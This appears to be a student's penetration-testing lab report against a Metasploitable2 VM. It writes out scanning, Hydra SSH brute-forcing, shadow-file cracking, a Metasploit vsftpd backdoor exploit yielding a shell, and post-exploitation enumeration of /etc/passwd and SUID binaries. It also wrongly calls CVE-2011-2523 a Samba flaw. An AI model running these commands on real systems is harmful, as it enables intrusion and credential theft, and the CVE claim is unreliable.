@@ -1,0 +1,91 @@
+1. Scanning & Enumeration
+Advanced Nmap Scans:
+•	Version Detection & OS Fingerprinting:
+o	Ran:
+o	nmap -sV -O 192.168.56.102
+	-sV enabled service/version detection.
+	-O attempted OS detection.
+	Successfully identified services such as Apache httpd, vsftpd, and OpenSSH on Metasploitable2.
+	OS detection reported a high probability of the system being a Linux 2.6.x kernel (which aligns with Metasploitable2).
+•	Nmap Scripting Engine (NSE):
+o	Used:
+o	nmap --script vuln 192.168.56.102
+	Identified multiple known vulnerabilities in services like vsftpd and Samba.
+Web Directory and Vulnerability Scanning:
+•	Nikto:
+o	Scanned Metasploitable2’s web server:
+o	nikto -h http://192.168.56.102
+	Discovered outdated Apache versions and default files, including phpMyAdmin, and possible file upload vulnerabilities.
+•	Dirb:
+o	Ran a recursive directory scan:
+o	dirb http://192.168.56.102
+	Located hidden directories like /admin, /test, and /uploads.
+•	Gobuster:
+o	Used wordlists to brute-force potential directories:
+o	gobuster dir -u http://192.168.56.102 -w /usr/share/wordlists/dirb/common.txt
+	Results confirmed Dirb findings and uncovered additional paths.
+
+
+2. System Hacking Basics
+Password Cracking:
+•	John the Ripper:
+o	Cracked password hashes extracted from /etc/shadow (in a simulated lab):
+o	unshadow passwd shadow > combined.txt
+o	john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt
+	Successfully cracked weak passwords such as 123456, password, and qwerty.
+•	Hydra:
+o	Conducted brute-force SSH login attempts:
+o	hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.102
+	Recovered credentials for msfadmin with password msfadmin.
+Understanding Password Storage:
+•	Studied hashing algorithms like MD5, SHA1, and bcrypt.
+•	Identified hash types from /etc/shadow entries using tools like hash-identifier.
+Metasploit Framework Practice:
+•	Launched msfconsole and exploited known vulnerabilities in Metasploitable2:
+•	use exploit/unix/ftp/vsftpd_234_backdoor
+•	set RHOST 192.168.56.102
+•	run
+o	Successfully gained shell access through vsftpd backdoor.
+o	Used post/linux/gather/enum_users_history to enumerate users and history.
+
+
+3. Vulnerability Analysis
+Searchsploit (Exploit-DB):
+•	Queried vulnerabilities:
+•	searchsploit Samba 3.0.20
+o	Located matching exploits that aligned with services on the target machine.
+•	Used:
+•	searchsploit -m exploit/linux/remote/16320.c
+o	Transferred exploit code to Kali for compilation and execution.
+OpenVAS / Nessus:
+•	Installed OpenVAS (Greenbone Vulnerability Management):
+o	Performed a full system scan of Metasploitable2.
+o	Reported dozens of critical vulnerabilities including:
+	Unpatched software
+	Weak SSL ciphers
+	Misconfigured services
+o	Exported vulnerability report for documentation and analysis.
+CVE Knowledge:
+•	Researched CVEs tied to discovered vulnerabilities.
+o	Example: CVE-2011-2523 (Samba remote code execution)
+o	Learned how to match Nmap/Nessus findings to specific CVEs for manual exploit crafting or Metasploit usage.
+
+
+4. Hands-On Tasks
+Password-Protected ZIP/PDF Cracking:
+•	Cracked ZIP file using fcrackzip:
+•	fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt secret.zip
+o	Password: dragon.
+•	Cracked password-protected PDF using pdfcrack:
+•	pdfcrack -f locked.pdf -w /usr/share/wordlists/rockyou.txt
+o	Password successfully recovered.
+Enumeration on Vulnerable Linux System (Metasploitable2):
+•	After gaining shell via Metasploit, enumerated:
+o	User accounts: cat /etc/passwd
+o	SUID binaries: find / -perm -4000 -type f 2>/dev/null
+o	Running processes: ps aux
+o	Network connections: netstat -tulnp
+o	Kernel version: uname -a (Useful for privilege escalation)
+
+Conclusion
+This stage of the cybersecurity lab focused on active engagement with vulnerability assessment, enumeration, and exploitation. Tools like Nmap, Hydra, and Metasploit allowed me to simulate real-world attacks in a controlled environment. Understanding CVEs and leveraging open-source databases sharpened my vulnerability research skills. Password cracking exercises emphasized the criticality of strong credential policies. These tasks solidified my practical understanding of attack surfaces and laid the foundation for future penetration testing modules.
